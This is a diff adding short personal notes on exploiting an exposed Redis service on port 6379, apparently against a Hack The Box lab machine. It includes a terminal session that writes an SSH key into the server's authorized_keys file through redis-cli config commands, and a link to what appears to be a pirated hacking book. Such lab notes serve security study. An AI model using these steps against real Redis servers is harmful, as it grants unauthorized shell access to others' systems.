@@ -1,0 +1,19 @@
+port 6379 redis exploit 
+
+http://illshiz.com/ethical_hacking/Kali%20Linux%20-%20An%20Ethical%20Hacker%27s%20Cookbook%20End-to-end%20penetration%20testing%20solutions%20-%205031%20%5BECLiPSE%5D/Kali%20Linux%20-%20An%20Ethical%20Hacker%27s%20Cookbook.pdf
+
+page 416 how to exploit redis
+
+➜  postman git:(master) ✗ cat key.txt | redis-cli -h 10.10.10.160 -x set crackit
+OK
+➜  postman git:(master) ✗ redis-cli -h 10.10.10.160                 
+10.10.10.160:6379> config get dir
+1) "dir"
+2) "/var/lib/redis"
+10.10.10.160:6379> config set dir .ssh
+OK
+10.10.10.160:6379> config set dbfilename "authorized_keys"
+OK
+10.10.10.160:6379> save
+OK
+10.10.10.160:6379>
